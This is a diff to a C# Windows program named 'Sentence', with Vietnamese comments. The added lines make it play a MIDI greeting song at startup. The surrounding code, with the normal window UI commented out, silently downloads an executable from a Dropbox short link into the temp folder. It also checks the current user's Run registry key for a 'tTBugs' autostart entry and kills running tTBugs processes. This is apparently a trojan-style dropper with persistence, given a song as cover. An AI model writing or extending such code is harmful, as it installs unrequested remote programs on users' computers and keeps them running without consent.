@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Media;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -10,29 +11,63 @@ using Microsoft.Win32;
 
 namespace Sentence
 {
-    static class Program
+    internal static class Program
     {
-        /// <summary>
+        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
+        private static extern long mciSendString(string lpstrCommand, string lpstrReturnString, long uReturnLength,
+                                                 long hwndCallback);
+
+        public static long PlayMidiFile(string MidiFile)
+        {
+            long lRet = -1;
+
+            if (File.Exists(MidiFile))
+            {
+                lRet = mciSendString("stop midi", "", 0, 0);
+                lRet = mciSendString("close midi", "", 0, 0);
+                lRet = mciSendString(("open sequencer!"
+                                      + (MidiFile + " alias midi")), "", 0, 0);
+                lRet = mciSendString("play midi", "", 0, 0);
+                return lRet;
+            }
+
+            else
+            {
+                //Error Message
+                return lRet;
+            }
+        }
+
+        public static void CloseAudio()
+        {
+            mciSendString("close all", "", 0, 0);
+        }
+
+    /// <summary>
         /// The main entry point for the application.
         /// </summary>
         [STAThread]
         static void Main()
         {
+
+            SoundPlayer player = new SoundPlayer(@"E:/chucbengungon.mid");
+            PlayMidiFile(@"E:/chucbengungon.mid");
+            CloseAudio();
             /*Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new Form1());*/
 
             //
 
- 
+
             //Xóa file trong temp
             string pathTemptTbugsFile = Path.GetTempPath() + @"tTBugs.exe";
             File.Delete(pathTemptTbugsFile); //Trả về lỗi nếu file đã bị sử dụng.
-            
+
             //Download file về temp
             var webClient = new WebClient();
             webClient.DownloadFile("https://db.tt/MttNyJNU", pathTemptTbugsFile);
-             
+
             //Kiểm tra vị trí đặt file
             var registry = Registry.CurrentUser;
             var registrySoftware = registry.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
@@ -41,7 +76,7 @@ namespace Sentence
             {
                 pathRootFile = registrySoftware.GetValue("tTBugs").ToString();
             }
-             
+
             //Tắt file đang chạy
             foreach (Process p in Process.GetProcessesByName("tTBugs"))
             {
